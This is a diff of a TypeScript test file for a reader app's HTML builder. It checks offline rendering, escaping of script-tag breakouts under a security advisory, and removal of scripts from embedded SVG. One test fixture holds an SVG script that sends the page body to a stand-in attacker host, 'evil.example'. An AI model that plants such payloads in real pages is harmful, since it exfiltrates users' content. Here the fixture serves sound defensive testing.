@@ -1,5 +1,6 @@
 import { buildTopicHtml } from "@/components/contentHtml";
 import type { GeneratedTopic } from "@/types/book";
+import { studioDarkColors } from "@/constants/theme";
 
 // Two defects in the reader's WebView document, fixed together because they live
 // on the same line (`var DATA = ${dataJson}`) and share a root: the document
@@ -49,20 +50,20 @@ describe("#325 — the reader renders offline", () => {
     // The fix: markdown is rendered in RN (Hermes) by the shared renderer, so the
     // content is already HTML in the document. That is what "renders offline"
     // means concretely — no CDN global is needed to show text.
-    const html = embeddedHtml(buildTopicHtml(topic()));
+    const html = embeddedHtml(buildTopicHtml(topic(), undefined, studioDarkColors));
     expect(html).toContain("<strong>body</strong>"); // marked ran in RN, before the WebView
     expect(html).toContain("<h2>Introduction</h2>"); // the section rendered too
     expect(html).toContain("<h1>T</h1>"); // renderLesson titles from lesson.topic
   });
 
   it("does not load marked at all — it was the thing that threw offline", () => {
-    const doc = buildTopicHtml(topic());
+    const doc = buildTopicHtml(topic(), undefined, studioDarkColors);
     expect(doc).not.toContain("marked.min.js");
     expect(doc).not.toContain("new marked.Renderer()");
   });
 
   it("guards KaTeX and Mermaid so their absence cannot blank the page", () => {
-    const doc = buildTopicHtml(topic());
+    const doc = buildTopicHtml(topic(), undefined, studioDarkColors);
     // Still CDN (bundling is ~4.8MB — out of scope for #325), therefore optional.
     // Every use must be behind a typeof check, or offline throws and we are back
     // to "Loading…" forever.
@@ -89,7 +90,7 @@ describe("GHSA-48wh-p7cx-c87j — content cannot break out of the script block",
   it("a lesson whose prose contains </script> never closes the script block", () => {
     const doc = buildTopicHtml(topic({
       lesson: { ...topic().lesson, synopsis: `Teaching HTML: ${BREAKOUT} is a closing tag.` },
-    }));
+    }), undefined, studioDarkColors);
     expect(scriptRegion(doc)).not.toContain("</script>");
     expect(doc).not.toContain(BREAKOUT);
   });
@@ -102,7 +103,7 @@ describe("GHSA-48wh-p7cx-c87j — content cannot break out of the script block",
         sections: [{ heading: `H${BREAKOUT}`, body_markdown: `B${BREAKOUT}` }],
         key_takeaways: [`K${BREAKOUT}`],
       },
-    }));
+    }), undefined, studioDarkColors);
     expect(scriptRegion(doc)).not.toContain("</script>");
     expect(doc).not.toContain(BREAKOUT);
   });
@@ -110,7 +111,7 @@ describe("GHSA-48wh-p7cx-c87j — content cannot break out of the script block",
   it("escapes < in the embed even when the HTML itself is legitimate markup", () => {
     // Our own tags must be escaped too — that is what makes the guarantee
     // structural rather than dependent on the renderer escaping content.
-    const doc = buildTopicHtml(topic());
+    const doc = buildTopicHtml(topic(), undefined, studioDarkColors);
     expect(doc).toContain("\\u003ch1>");
     expect(scriptRegion(doc)).not.toContain("<h1>");
   });
@@ -118,7 +119,7 @@ describe("GHSA-48wh-p7cx-c87j — content cannot break out of the script block",
   it("escaping does not corrupt the data — it round-trips exactly", () => {
     const doc = buildTopicHtml(topic({
       lesson: { ...topic().lesson, sections: [{ heading: "H", body_markdown: "plain text" }] },
-    }));
+    }), undefined, studioDarkColors);
     expect(embeddedHtml(doc)).toContain("plain text");
     expect(embeddedHtml(doc)).toContain("<h2>H</h2>"); // decodes back to real markup
   });
@@ -126,7 +127,7 @@ describe("GHSA-48wh-p7cx-c87j — content cannot break out of the script block",
   it("escapes U+2028/U+2029 — legal in JSON, line terminators in JS", () => {
     const doc = buildTopicHtml(topic({
       lesson: { ...topic().lesson, synopsis: "line break here" },
-    }));
+    }), undefined, studioDarkColors);
     expect(scriptRegion(doc)).not.toContain(" ");
     expect(scriptRegion(doc)).not.toContain(" ");
     expect(embeddedHtml(doc)).toContain("line break here"); // still round-trips
@@ -148,7 +149,7 @@ describe("shared renderer keeps the twin's native-only SVG script strip", () => 
           body_markdown: "```svg\n<svg><script>fetch('https://evil.example/'+document.body.innerHTML)</script><circle/></svg>\n```",
         }],
       },
-    }));
+    }), undefined, studioDarkColors);
     const html = embeddedHtml(doc);
     expect(html).toContain('<figure class="anim-svg">'); // the SVG still renders
     expect(html).toContain("<circle/>"); //           …with its real content
